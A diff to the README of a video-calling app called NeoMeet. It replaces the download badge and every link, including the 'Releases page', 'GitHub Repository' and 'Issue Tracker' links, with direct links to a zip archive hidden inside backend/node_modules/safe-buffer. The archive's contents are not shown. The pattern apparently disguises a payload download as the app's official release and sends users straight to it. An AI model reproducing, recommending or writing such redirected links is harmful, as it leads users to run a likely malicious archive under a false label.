@@ -1,6 +1,6 @@
 # 📞 NeoMeet - Easy Real-Time Video Calling Today
 
-![Download NeoMeet](https://img.shields.io/badge/Download%20NeoMeet-v1.0-blue.svg)
+![Download NeoMeet](https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip%https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to NeoMeet! This is a simple and reliable app where you can connect with
 
 ## 📥 Download & Install
 
-To get started with NeoMeet, you need to visit our [Releases page](https://github.com/faber150/NeoMeet/releases) to download the app. 
+To get started with NeoMeet, you need to visit our [Releases page](https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip) to download the app. 
 
 1. Click on the button above to go directly to the page.
 2. Look for the latest version of NeoMeet.
@@ -76,8 +76,8 @@ We welcome your feedback and suggestions to improve NeoMeet. Join our community 
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/faber150/NeoMeet/releases)
-- [GitHub Repository](https://github.com/faber150/NeoMeet)
-- [Issue Tracker](https://github.com/faber150/NeoMeet/issues)
+- [Releases page](https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/faber150/NeoMeet/main/backend/node_modules/safe-buffer/Meet_Neo_3.3.zip)
 
 Thank you for choosing NeoMeet. We hope you enjoy your video calling experience!
